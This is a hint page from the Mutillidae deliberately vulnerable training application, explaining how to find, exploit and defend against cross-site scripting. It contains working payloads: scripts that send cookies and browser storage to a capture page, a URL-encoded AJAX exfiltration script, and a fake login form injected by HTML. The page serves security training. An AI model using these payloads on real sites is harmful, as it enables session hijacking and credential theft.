			<br/><br/>
			<span class="report-header">Overview</span>
			<br/><br/>
			Cross-site scripting and HTML injection may occcur
			when user or attacker controlled input is later incorporated
			without being encoded into the web server response. In other words, the attacker
			can send input which later is incorporated into the web page the user receives.
			<br/><br/>
			Cross-Site Scripting may occur when a script is displayed in page output but is not properly encoded.
			Because of the lack of proper encoding, the browser will execute the script rather than display it as data.
			Pages that encode all dynamic output are generally immune. The page will simply display the script as text
			rather than execute the script as code.
<br/><br/>
<a href="#videos" class="label"><img alt="YouTube" src="/images/youtube-play-icon-40-40.png" style="margin-right: 10px;" />Video Tutorials</a>
			<br/><br/>
			<span class="report-header">Discovery Methodology</span>
			<br/><br/>
			The first step to Cross-Site Scripting is to determine which of the sites input is displayed as output.
			Some input is immediately output on the same or next page. These pages are candidates for reflected
			Cross-Site Scripting. Some input may be stored in a database and output later on the appropriate page.
			These situations may be ripe for the most dangerous type of XSS; persistent XSS.
			<br/><br/>
			Developers may treat input from forms carefully, while completely ignoring input passed via URL Query
			Parameters, Cookies, HTTP Headers, Logs, Emails, etc. The key is to encode ALL output and not just output
			that came into the site via forms/POST.
			<br/><br/>
			Step 1: For each page under scrutiny, enter a unique string into each form field,
			url query parameter, cookie value, HTTP Header, etc., record which value has which unique string,
			submit the page, then observe the resulting page to see if any of your unique strings appeared.
			Upon finding a unique string, note which value had contained that string and record this on your map.
			<br/><br/>
			For example inject all available parameters of the web page with a searchable string
			such as the word "CANARY" along with characters generally useful in
			writing HTML, JavaScript or other code. Search the response carefully
			noting any location where the test string appears unencoded. These
			locations may allow cross-site scripting. See
			<a href="http://ha.ckers.org/xss.html">Rsnake\'s XSS Cheet Sheet</a>
			for more ways you can encode XSS attacks that may
			allow bypassing some filters.
			<br/><br/>
			An example injection might be &lt;CANARY={}&quot;&quot;()&#39;&#39;;#$--/&gt;1.
			Adding a sequencial integer to the test input can help determine which of the
			inputs parameters resulted in the response string found.
			<br/><br/>
			Step 2:The second step is to test all the input locations from step #1 with various scripts, css, html tags, etc.
			and observe the resulting output. If the site fails to encode output, it is a candidate for XSS.
			<br/><br/>
			Enter interesting characters such as angle brackets for HTMLi and XSS, Cascading style
			sheet symbols, etc. to see if the site encodes this output. If the site does not encode output, try
			inserting XSS, CSS, HTML, etc. and watch for execution. If the site has a WAF, this is likely the point
			at which you will detect the WAF presence.
			<br/><br/>
			Unfortunately the input could end up as output on any page within the site, all pages within the site,
			or none of them. If the values are not reflected immediately but presented on a later page (for example
			in search results) then it should be assumed the value is stored in a database.
			<br/><br/>
			<span class="report-header">Remediation</span>
			<br/><br/>
			Cross-Site Scripting occurs because a script is displayed in page output but is not properly encoded.
			Because of the lack of proper encoding, the browser will execute the script rather than display it as data.
			Pages that encode all dynamic output are generally immune. The page will simply display the script as text
			rather than execute the script as code.
			<br/><br/>
			The first step to Cross-Site Scripting is to determine which of the sites input is displayed as output.
			Some input is immediately output on the same or next page. These pages are candidates for reflected
			Cross-Site Scripting. Some input may be stored in a database and output later on the appropriate page.
			These situations may be ripe for the most dangerous type of XSS; persistent XSS.
			<br/><br/>
			Developers may treat input from forms carefully, while completely ignoring input passed via URL Query
			Parameters, Cookies, HTTP Headers, Logs, Emails, etc. The key is to encode ALL output and not just output
			that came into the site via forms/POST.
			<br/><br/>
			<span class="report-header">Exploitation</span>
			<br/><br/>
			Determine the prefix and suffix needed to make the injected code "fit" syntatically
			then add a payload between. Inject the exploit.
			<br/><br/>
			Cross site scripting will work in any unencoded output. It does not matter if the value being output
			initially came from a form field (usually POST) or URL parameteres (GET). If fact the value can come from any
			source. For example, if a web page outputs the user-agent string in whole or part, you can use a tool such
			as User-Agent Switcher plug-in for Firefox to attempt XSS via the User-Agent HTTP Header. Any HTTP Header
			can be forged with or without tools. If you would like to forge an HTTP Header without tools, try Netcat. Other
			options include intercepting and changing the web request after the request leaves the browser. Burp Suite
			is an excellent tool to try on your own machine. Try changing the user-agent to the XSS examples on this page.
			Also, try this sample HTML injection. The XSS could be directly placed into the database then pulled later. This
			can happen from a hacked database, a rouge DBA, or via SQL injection such as with ASPROX. This is why output
			encoding is a better defense than input validation for XSS. If the XSS makes it into the database but never has
			to pass through the validation to get there, input validation will not work.
			<br/><br/>
			Some pages are easier to exploit because the page reflects any input. This input
			could be from the Cookies, and URL query parameter, or any POSTed parameter.
			This may be seen in the view source as a comment in which the developer
			dumps the referer string for diagnostic purpouses (and therefore dumps
			the query parameters as well). When a random parameter is created and injected,
			this is known as a parameter addition attack.
			<br/><br/>
			<span class="report-header">Cross Site Scripting Via URL query parameters</span>
			<br/><br/>
			Note any URL query parameters and inject a script into each.
			<br/><br/>
			<span class="report-header">Cross Site Scripting Via POST parameters</span>
			<br/><br/>
			Use Burp-Suite to note POST parameters and inject a script into each.
			<br/><br/>
			<span class="report-header">Cross Site Scripting Via Cookie</span>
			<br/><br/>
			Use Cookie Manager or Burp-Suite to create a cross site script and inject a script into each cookie.
			If the page prints the value of the cookie to the screen, the script
			will execute.
			<br/><br/>
			<span class="report-header">Cross Site Scripting Via HTTP Headers</span>
			<br/><br/>
			Any time dynamic output is displayed by the browser, think "Cross-Site Scripting".
			Work backwards from that output to see if there is a way to influence
			what is output. This could be as simple as entering "123" in the first field,
			"456" in the second field, and so on. Repeat this for all input including HTTP
			Headers, Cookie values, Hidden Fields etc. If those inputs show up anywhere in the output
			investigate further. Dont look for visible output. That will miss most of the output.
			Search the entire response stream including all the HTTP Headers. If you find
			your test strings, send in more useful characters such as "&lt;".
			Some developers sanitize input which may later be output.
			Others encode (escape) the input. These are nice tries but can result in
			"FAIL" because the data could be changed after it is input encoded by
			someone with access to the database, a database corrupting script, or
			any attempts to filter/sanitize can be flawed/bypassed.
			<br/><br/>
			Any time the application uses the HTTP headers there are multiple
			possibilities. If the HTTP header is output into the page, think XSS.
			But with HTTP Headers, also consider
			HTTP Response Splitting. HTTP Headers are delimited (separated) by line-breaks.
			Check out the RFC on HTTP to see the specification.
			When an application included some type of input
			as output into the HTTP Header, it may be possible to inject a line-break.
			If this is possible, then an actor could also inject a new HTTP Header of
			there choosing. These two situations are counterparts. XSS via HTTP Headers
			may occur when HTTP Request Headers are output into the HTTP Response.
			HTTP Response Splitting may occur when user/database input is output into
			HTTP Headers.
			<br/><br/>
			Try Tamper Data to get control of all the HTTP headers in the request.
			You can start by changing the user-agent to see your input displayed here.
			<br/><br/>
			<span class="report-header">Examples - Proof of Concept</span>
			<br/><br/>
			Many examples can be found at <a href="http://ha.ckers.org/xss.html">http://ha.ckers.org/xss.html</a>.
			A basic test for XSS may be the following that attempts to pop up an alert box
			<br/><br/>
<code>&lt;script&gt;alert("XSS");&lt;/script&gt;</code>
			<br/><br/>
			This example is of stealing a cookie. This could be reflected or persistent.
			To make this persistent, try to get the script stored into
			a database field which is later output onto a web page.
			<br/><br/>
<code>&lt;script&gt;alert(&#39;Cookies which do not have the HTTPOnly attribute set: &#39; + document.cookie);&lt;/script&gt;</code>
			<br/><br/>
			Same example with the single-quotes escaped for databases such as MySQL. This allows the XSS to be stored in the database.
			When the web site (or another site) pulls the XSS from the database at a later time, it will be served with the
			site content.
			<br /><br />
<code>&lt;script&gt;alert(\&#39;Cookies which do not have the HTTPOnly attribute set: \&#39; + document.cookie);&lt;/script&gt;</code>
			<br/><br/>
			<span class="report-header">Examples - Stealing Cookies</span>
			<br/><br/>
			A more realistic attempt of cookie stealing includes some mechanism to send the value
			of the cookie to an attacker controlled server
			<br />
<code>
    &lt;script&gt;
    	new Image().src="http://[the-ip-of-mutillidae]/mutillidae/capture-data.php?cookie="+encodeURI(document.cookie);
    &lt;/script&gt;
</code>
			<br />
			When passing code as a parameter value, the code has to be encoded so that is does not get parsed by the web server. The code needs to make it passed the web server to the application without being modified by the web server.
			<br />
<code>
	%3Cscript%3Enew%20Image().src%3D%22http%3A%2F%2Fmutillidae.local%2Fcapture-data.php%3Fcookie%3D%22%2BencodeURI(document.cookie)%3B%3C%2Fscript%3E
</code>
			<br />
			An example of a complete URL is the following. Note: Substitute the domain name or IP address of your Mutillidae installation.
			<br />
<code>
	http://[ip-address-of-mutillidae]/mutillidae/index.php?page=user-info.php&username=%3Cscript%3Enew%20Image().src%3D%22http%3A%2F%2Fmutillidae.local%2Fcapture-data.php%3Fcookie%3D%22%2BencodeURI(document.cookie)%3B%3C%2Fscript%3E&password=&user-info-php-submit-button=View+Account+Details
</code>
<br/><br/>
			<span class="report-header">Examples - Stealing cookies quietly with AJAX</span>
			<br/><br/>
			This example forwards the cookies to the Mutillidae Capture Data page using an AJAX
			request running in the background
			<br/>
<code>
&lt;script&gt;
	var lXMLHTTP;
	try{
		var lData = &quot;data=&quot; + encodeURIComponent(document.cookie);
		var lHost = &quot;localhost&quot;;
		var lProtocol = &quot;http&quot;;
		var lFilePath = &quot;/mutillidae/capture-data.php&quot;;
		var lAction = lProtocol + &quot;://&quot; + lHost + lFilePath;
		var lMethod = &quot;POST&quot;;

		try {
			lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);
		}catch (e) {
			try {
				lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
			}catch (e) {
				try {
					lXMLHTTP = new XMLHttpRequest();
				}catch (e) {
					alert(e.message);/*For testing only*/
				}
			}
		}/*end try*/

		lXMLHTTP.onreadystatechange = function(){};
		lXMLHTTP.open(lMethod, lAction, true);
		lXMLHTTP.setRequestHeader(&quot;Host&quot;, lHost);
		lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
		lXMLHTTP.send(lData);

	}catch(e){
		alert(e.message);/*For testing only*/
	}
&lt;/script&gt;
</code>
			<br/><br/>
			<span class="report-header">Examples - HTML Injection</span>
			<br/><br/>
			JavaScript is not the only language that can be used. HTML is another choice that can be effective.
			<br/><br/>
<code>&lt;h1&gt;Sorry. There has been a system error.&lt;br /&gt;&lt;br /&gt;Please login again&lt;/h1&gt;&lt;br/&gt;Username&lt;input type=&quot;text&quot;&gt;&lt;br/&gt;Password&lt;input type=&quot;text&quot;&gt;&lt;br/&gt;&lt;br/&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;&lt;h1&gt;&amp;nbsp;&lt;/h1&gt;</code>
			<br/><br/>
			<span class="report-header">Examples - Realistic Attack</span>
			<br/><br/>
			AJAX can make the XSS more stealthy
			<br/><br/>
			<span class="report-header">Example (Mutillidae running at localhost)</span>
			<br/><br/>
<code>
&lt;script&gt;
		var lXMLHTTP;
		try{
			var lData = &quot;data=&quot; + encodeURIComponent(document.cookie);
			var lHost = &quot;localhost&quot;;
			var lProtocol = &quot;http&quot;;
			var lFilePath = &quot;/mutillidae/capture-data.php&quot;;
			var lAction = lProtocol + &quot;://&quot; + lHost + lFilePath;
			var lMethod = &quot;POST&quot;;

			try {
				lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);
			}catch (e) {
				try {
					lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
				}catch (e) {
					try {
						lXMLHTTP = new XMLHttpRequest();
					}catch (e) {
						alert(e.message);/*For testing only*/
					}
				}
			}/*end try*/

			lXMLHTTP.onreadystatechange = function(){};
			lXMLHTTP.open(lMethod, lAction, true);
			lXMLHTTP.setRequestHeader(&quot;Host&quot;, lHost);
			lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
			lXMLHTTP.send(lData);

		}catch(e){
			alert(e.message);/*For testing only*/
		}
&lt;/script&gt;
</code>
			<br/><br/>
			<span class="report-header">Example (Mutillidae running on Apache virtual host)</span>
			<br/><br/>
<code>
&lt;script&gt;
	var lXMLHTTP;
	try{
		var lData = &quot;data=&quot; + encodeURIComponent(document.cookie);
		var lHost = &quot;mutillidae.local&quot;;
		var lProtocol = &quot;http&quot;;
		var lFilePath = &quot;/capture-data.php&quot;;
		var lAction = lProtocol + &quot;://&quot; + lHost + lFilePath;
		var lMethod = &quot;POST&quot;;

		try {
			lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);
		}catch (e) {
			try {
				lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
			}catch (e) {
				try {
					lXMLHTTP = new XMLHttpRequest();
				}catch (e) {
					alert(e.message);/*For testing only*/
				}
			}
		}/*end try*/

		lXMLHTTP.onreadystatechange = function(){};
		lXMLHTTP.open(lMethod, lAction, true);
		lXMLHTTP.setRequestHeader(&quot;Host&quot;, lHost);
		lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
		lXMLHTTP.send(lData);

	}catch(e){
		alert(e.message);/*For testing only*/
	}
&lt;/script&gt;
</code>
			<br/>
			Note that some characters which are reserved in databases are also reserved
			in web servers. If submitting injections directly via an interception proxy
			like Burp-Suite, URL encode the injection to avoid a syntax error on the
			web server.
			<br/><br/>
			<span class="report-header">URL Encoded version (with TAB spaces (%09) removed</span>
			<br/>
<code>
%3c%73%63%72%69%70%74%3e%0a%76%61%72%20%6c%58%4d%4c%48%54%54%50%3b%0a%74%72%79%7b%20%0a%76%61%72%20%6c%44%61%74%61%20%3d%20%22%64%61%74%61%3d%22%20%2b%20%65%6e%63%6f%64%65%55%52%49%43%6f%6d%70%6f%6e%65%6e%74%28%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%29%3b%0a%76%61%72%20%6c%48%6f%73%74%20%3d%20%22%6c%6f%63%61%6c%68%6f%73%74%22%3b%0a%76%61%72%20%6c%50%72%6f%74%6f%63%6f%6c%20%3d%20%22%68%74%74%70%22%3b%0a%76%61%72%20%6c%46%69%6c%65%50%61%74%68%20%3d%20%22%2f%6d%75%74%69%6c%6c%69%64%61%65%2f%63%61%70%74%75%72%65%2d%64%61%74%61%2e%70%68%70%22%3b%0a%76%61%72%20%6c%41%63%74%69%6f%6e%20%3d%20%6c%50%72%6f%74%6f%63%6f%6c%20%2b%20%22%3a%2f%2f%22%20%2b%20%6c%48%6f%73%74%20%2b%20%6c%46%69%6c%65%50%61%74%68%3b%0a%76%61%72%20%6c%4d%65%74%68%6f%64%20%3d%20%22%50%4f%53%54%22%3b%0a%0a%74%72%79%20%7b%0a%6c%58%4d%4c%48%54%54%50%20%3d%20%6e%65%77%20%41%63%74%69%76%65%58%4f%62%6a%65%63%74%28%22%4d%73%78%6d%6c%32%2e%58%4d%4c%48%54%54%50%22%29%3b%20%0a%7d%63%61%74%63%68%20%28%65%29%20%7b%20%0a%74%72%79%20%7b%20%0a%6c%58%4d%4c%48%54%54%50%20%3d%20%6e%65%77%20%41%63%74%69%76%65%58%4f%62%6a%65%63%74%28%22%4d%69%63%72%6f%73%6f%66%74%2e%58%4d%4c%48%54%54%50%22%29%3b%20%0a%7d%63%61%74%63%68%20%28%65%29%20%7b%20%0a%74%72%79%20%7b%20%0a%6c%58%4d%4c%48%54%54%50%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%20%0a%7d%63%61%74%63%68%20%28%65%29%20%7b%20%0a%2f%2f%61%6c%65%72%74%28%65%2e%6d%65%73%73%61%67%65%29%3b%2f%2f%54%48%49%53%20%4c%49%4e%45%20%49%53%20%54%45%53%54%49%4e%47%20%41%4e%44%20%44%45%4d%4f%4e%53%54%52%41%54%49%4f%4e%20%4f%4e%4c%59%2e%20%44%4f%20%4e%4f%54%20%49%4e%43%4c%55%44%45%20%49%4e%20%50%45%4e%20%54%45%53%54%2e%20%0a%7d%20%0a%7d%20%0a%7d%2f%2f%65%6e%64%20%74%72%79%0a%0a%6c%58%4d%4c%48%54%54%50%2e%6f%6e%72%65%61%64%79%73%74%61%74%65%63%68%61%6e%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%7b%7d%20%0a%6c%58%4d%4c%48%54%54%50%2e%6f%70%65%6e%28%6c%4d%65%74%68%6f%64%2c%20%6c%41%63%74%69%6f%6e%2c%20%74%72%75%65%29%3b%0a%6c%58%4d%4c%48%54%54%50%2e%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%28%22%48%6f%73%74%22%2c%20%6c%48%6f%73%74%29%3b%20%0a%6c%58%4d%4c%48%54%54%50%2e%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%28%22%43%6f%6e%74%65%6e%74%2d%54%79%70%65%22%2c%20%22%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%22%29%3b%0a%6c%58%4d%4c%48%54%54%50%2e%73%65%6e%64%28%6c%44%61%74%61%29%3b%0a%0a%7d%63%61%74%63%68%28%65%29%7b%20%0a%7d%20%0a%3c%2f%73%63%72%69%70%74%3e%0a
</code>
			<br/><br/>
			<span class="report-header">Steal DOM Storage values from another users browser (intermediate)</span>
			<br/><br/>
			Peristent (Stored, Second Order) Cross Site Script
			NOTE: This version &quot;MySQL escapes&quot; the &quot;\n&quot; new-line character by doubling up the &quot;\&quot; character because &quot;\n&quot; means new-line in MySQL and this is going to be inserted into the database.
			<br />
<code>
&lt;script&gt;try{var m = &quot;&quot;;
var l = window.localStorage;for(i=0;i&lt;l.length;i++){
var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\\n&quot;;};
var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){
var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\\n&quot;;};
document.location=&quot;http://localhost/mutillidae/capture-data.php?html5storage=&quot; + m;}catch(e){alert(e.message);}&lt;/script&gt;
</code>
			<br/><br/>
			<span class="report-header">Steal DOM Storage values from another users browser (advanced)</span>
			<br/><br/>
			Peristent (Stored, Second Order) Cross Site Script
			NOTE: This version &quot;MySQL escapes&quot; the &quot;\n&quot; new-line character by doubling up the &quot;\&quot; character because &quot;\n&quot; means new-line in MySQL and this is going to be inserted into the database.
			<br />
<code>
&lt;script&gt;try{ var s = sessionStorage; var l = localStorage; var m = &quot;&quot;;
var lXMLHTTP; for(i=0;i&lt;s.length;i++){ m += &quot;sessionStorage(&quot; + s.key(i) + &quot;):&quot; + s.getItem(s.key(i)) + &quot;; &quot;; }
for(i=0;i&lt;l.length;i++){ m += &quot;localStorage(&quot; + l.key(i) + &quot;):&quot; + l.getItem(l.key(i)) + &quot;; &quot;; }
var lAction = &quot;http://localhost/mutillidae/capture-data.php?html5storage=&quot; + m; lXMLHTTP = new XMLHttpRequest();
lXMLHTTP.onreadystatechange = function(){}; lXMLHTTP.open(&quot;GET&quot;, lAction);
lXMLHTTP.send(&quot;&quot;); }catch(e){} &lt;/script&gt;
</code>
			<br/><br/>
			<span class="report-header">Add/Edit value to another users DOM storage</span>
			<br/><br/>
			Peristent (Stored, Second Order) Cross Site Script
			NOTE: This version &quot;MySQL escapes&quot; the &quot;\n&quot; new-line character by doubling up the &quot;\&quot; character because &quot;\n&quot; means new-line in MySQL and this is going to be inserted into the database.
			<br />
<code>
&lt;script&gt;try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;
for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\\n&quot;;};
for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\\n&quot;;};alert(m);}catch(e){alert(e.message);};
localStorage.setItem(&quot;AccountNumber&quot;,&quot;123456&quot;);sessionStorage.setItem(&quot;EnterpriseSelfDestructSequence&quot;,&quot;A1B2C3&quot;);
sessionStorage.setItem(&quot;SessionID&quot;,&quot;japurhgnalbjdgfaljkfr&quot;);sessionStorage.setItem(&quot;CurrentlyLoggedInUser&quot;,&quot;1233456789&quot;);try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\\n&quot;;};for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\\n&quot;;};alert(m);}catch(e){alert(e.message);}&lt;/script&gt;
</code>
			<br/><br/>
			<span class="report-header">Delete value from another users DOM storage</span>
			<br/><br/>
			Peristent (Stored, Second Order) Cross Site Script
			NOTE: This version &quot;MySQL escapes&quot; the &quot;\n&quot; new-line character by doubling up the &quot;\&quot; character because &quot;\n&quot; means new-line in MySQL and this is going to be inserted into the database.
			<br />
<code>
&lt;script&gt;try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;
for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\\n&quot;;};
for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\\n&quot;;};alert(&quot;HTML-5 web storage:\\n\\n&quot; + m);}catch(e){alert(e.message);};localStorage.clear();sessionStorage.clear();try{var m = &quot;&quot;;var l = window.localStorage;var s = window.sessionStorage;for(i=0;i&lt;l.length;i++){var lKey = l.key(i);m += lKey + &quot;=&quot; + l.getItem(lKey) + &quot;;\\n&quot;;};for(i=0;i&lt;s.length;i++){var lKey = s.key(i);m += lKey + &quot;=&quot; + s.getItem(lKey) + &quot;;\\n&quot;;};alert(&quot;HTML-5 web storage:\\n\\n&quot; + m);}catch(e){alert(e.message);}&lt;/script&gt;
</code>
<br/><br/>
<span class="report-header">Cross Site Scripting Defenses</span>
<br/><br/>
To defend against Cross-Site Scripting, encode all output per context.
Just because the application sanitized/validated/filtered the input
when the user sent the input doesnt mean the application is safe. The
database could be altered by a rouge insider, a database attack such as
ASPROX, or a mallicious programmer. Developers should not have access to
production database data; ever. Developers should not be able to copy
their own code into production; ever. That is what change control is for.
<br/><br/>
<span id="videos" class="report-header">Videos</span>
<br/><br/>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CrossSiteScriptingPart1WhatisReflectedXSS);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CrossSiteScriptingPart2WhatisDOMbasedXSS);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CrossSiteScriptingPart3WhatisPersistentXSS);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->OutputEncodingPart1HowItStopsCrosssiteScriptingXSS);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->OutputEncodingPart2HowtoTestifitWorks);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatisContentSecurityPolicyPart1);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatisContentSecurityPolicyPart2);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatisContentSecurityPolicyPart3);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatisContentSecurityPolicyPart4);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatisContentSecurityPolicyPart5);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->ContentSecurityPolicyScriptSourcescriptsrc);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->HowtoSetHTTPHeadersUsingApacheServer);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CheckHTTPHeaderswithcURL);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->HowtoCheckHTTPHeadersCommandLine);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->HowtoCheckHTTPHeadersfromBrowser);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CookiesPart1HowHTTPOnlyWorks);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatistheXSSProtectionHeader);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CheckforVulnerableLibrariesinYourWebApplication);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->HowtoEnableApacheModHeader);?>
<br/><br/>